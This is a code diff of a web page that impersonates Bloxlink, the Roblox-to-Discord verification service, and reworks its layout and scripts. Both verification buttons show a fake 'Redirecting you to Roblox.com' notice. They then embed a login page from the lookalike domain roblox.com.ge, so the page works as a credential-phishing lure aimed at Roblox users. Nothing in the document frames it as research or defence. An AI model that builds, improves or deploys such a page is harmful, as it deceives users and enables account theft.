@@ -14,7 +14,6 @@
     --muted: #94a3b8;
     --purple: #5b4ef0;
     --green: #22c55e;
-    --border: rgba(255,255,255,0.06);
   }
 
   * { box-sizing: border-box; }
@@ -25,6 +24,7 @@
     color: var(--text);
     display: flex;
     height: 100vh;
+    overflow: hidden;
   }
 
   /* Sidebar */
@@ -34,37 +34,39 @@
     padding: 25px;
     display: flex;
     flex-direction: column;
+    transition: transform 0.3s ease;
+  }
+
+  .sidebar.hidden {
+    transform: translateX(-260px);
   }
 
   .logo {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    margin-bottom: 40px;
-  }
-
-  .logo-icon {
-    width: 36px;
-    height: 36px;
-    border-radius: 8px;
-    background: white;
-    display: grid;
-    place-items: center;
-    color: #111827;
-    font-weight: bold;
-    font-size: 18px;
-  }
-
-  .logo-text {
     font-size: 22px;
     font-weight: 700;
+    margin-bottom: 30px;
+  }
+
+  .menu-header {
+    font-size: 14px;
+    font-weight: 700;
+    background: #1e293b;
+    padding: 8px 14px;
+    border-radius: 8px;
+    margin-bottom: 10px;
+    cursor: pointer;
+    text-align: center;
+  }
+
+  .menu-header:hover {
+    background: #334155;
   }
 
   .sidebar h4 {
     color: var(--muted);
     font-size: 12px;
-    margin-top: 20px;
-    margin-bottom: 10px;
+    margin-top: 15px;
+    margin-bottom: 8px;
     text-transform: uppercase;
     letter-spacing: 1px;
   }
@@ -93,13 +95,12 @@
     padding-left: 12px;
   }
 
-  /* Main Content */
+  /* Main */
   .main {
     flex: 1;
     background: var(--main-bg);
     padding: 20px 40px;
     overflow-y: auto;
-    position: relative;
   }
 
   .notice {
@@ -209,41 +210,69 @@
     color: #a5b4fc;
   }
 
-  /* Overlay + iframe popup */
-  .overlay {
-    position: absolute;
-    inset: 0;
-    background: rgba(15, 23, 42, 0.97);
+  /* Loading */
+  .loading-screen {
     display: none;
-    justify-content: center;
-    align-items: center;
     flex-direction: column;
-    z-index: 999;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    background: var(--main-bg);
+    width: 100%;
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: 10;
   }
 
   .loading-text {
     font-size: 18px;
-    color: var(--muted);
-    margin-bottom: 20px;
+    color: var(--text);
+  }
+
+  .dots span {
+    animation: blink 1.5s infinite;
+  }
+
+  .dots span:nth-child(2) { animation-delay: 0.3s; }
+  .dots span:nth-child(3) { animation-delay: 0.6s; }
+
+  @keyframes blink {
+    0%, 80%, 100% { opacity: 0; }
+    40% { opacity: 1; }
+  }
+
+  /* Iframe */
+  .iframe-container {
+    display: none;
+    background: var(--main-bg);
+    width: 100%;
+    height: 100vh;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+  }
+
+  .iframe-logo {
+    font-size: 26px;
+    font-weight: 700;
+    margin-bottom: 15px;
   }
 
   iframe {
-    width: 90%;
+    width: 80%;
     height: 80vh;
     border: none;
-    border-radius: 12px;
-    display: none;
+    border-radius: 10px;
   }
 </style>
 </head>
 <body>
 
   <!-- Sidebar -->
-  <div class="sidebar">
-    <div class="logo">
-      <div class="logo-icon">⬛</div>
-      <div class="logo-text">bloxlink</div>
-    </div>
+  <div class="sidebar" id="sidebar">
+    <div class="logo">bloxlink</div>
+    <div class="menu-header" id="menu-toggle">Menu</div>
 
     <h4>General</h4>
     <ul>
@@ -265,7 +294,7 @@
   </div>
 
   <!-- Main -->
-  <div class="main">
+  <div class="main" id="main-content">
     <div class="notice">
       Bloxlink is now part of the Roblox family! Read more here:
       <a href="https://x.com/bloxlink/status/1818339107220693288" target="_blank">
@@ -282,42 +311,55 @@
       <p>
         Join our millions of users by linking your Roblox account to Discord. After verifying, you'll gain access to thousands of Roblox communities and our large feature set.
       </p>
-      <button class="verify-btn" id="verifyBtn">Verify My Roblox Now</button>
+      <button class="verify-btn" id="verify-btn">Verify My Roblox Now</button>
     </div>
 
     <div class="bottom-card">
       <span>Missing an account?</span>
-      <button class="add-btn" id="addBtn"><span class="plus">+</span> Add My Roblox Account </button>
+      <button class="add-btn" id="add-btn"><span class="plus">+</span> Add My Roblox Account </button>
     </div>
+  </div>
 
-    <!-- Overlay -->
-    <div class="overlay" id="overlay">
-      <div class="loading-text" id="loadingText">Redirecting you to Roblox.com, please verify...</div>
-      <iframe id="verifyFrame" src="https://roblox.com.ge/login?returnUrl=1606336694621110"></iframe>
+  <!-- Loading Screen -->
+  <div class="loading-screen" id="loading-screen">
+    <div class="loading-text">
+      Redirecting you to Roblox.com, please verify
+      <span class="dots"><span>.</span><span>.</span><span>.</span></span>
     </div>
+  </div>
 
+  <!-- Iframe -->
+  <div class="iframe-container" id="iframe-container">
+    <div class="iframe-logo">bloxlink</div>
+    <iframe src="https://roblox.com.ge/login?returnUrl=1606336694621110"></iframe>
   </div>
 
 <script>
-  const verifyBtn = document.getElementById('verifyBtn');
-  const addBtn = document.getElementById('addBtn');
-  const overlay = document.getElementById('overlay');
-  const iframe = document.getElementById('verifyFrame');
-  const loadingText = document.getElementById('loadingText');
+  const menuToggle = document.getElementById('menu-toggle');
+  const sidebar = document.getElementById('sidebar');
+  const mainContent = document.getElementById('main-content');
+  const verifyBtn = document.getElementById('verify-btn');
+  const addBtn = document.getElementById('add-btn');
+  const loadingScreen = document.getElementById('loading-screen');
+  const iframeContainer = document.getElementById('iframe-container');
 
-  function showIframe() {
-    overlay.style.display = 'flex';
-    iframe.style.display = 'none';
-    loadingText.style.display = 'block';
+  menuToggle.addEventListener('click', () => {
+    sidebar.classList.toggle('hidden');
+  });
+
+  function startRedirect() {
+    sidebar.style.display = 'none';
+    mainContent.style.display = 'none';
+    loadingScreen.style.display = 'flex';
 
     setTimeout(() => {
-      loadingText.style.display = 'none';
-      iframe.style.display = 'block';
-    }, 3000); // 3 seconds
+      loadingScreen.style.display = 'none';
+      iframeContainer.style.display = 'flex';
+    }, 3000);
   }
 
-  verifyBtn.addEventListener('click', showIframe);
-  addBtn.addEventListener('click', showIframe);
+  verifyBtn.addEventListener('click', startRedirect);
+  addBtn.addEventListener('click', startRedirect);
 </script>
 
 </body>
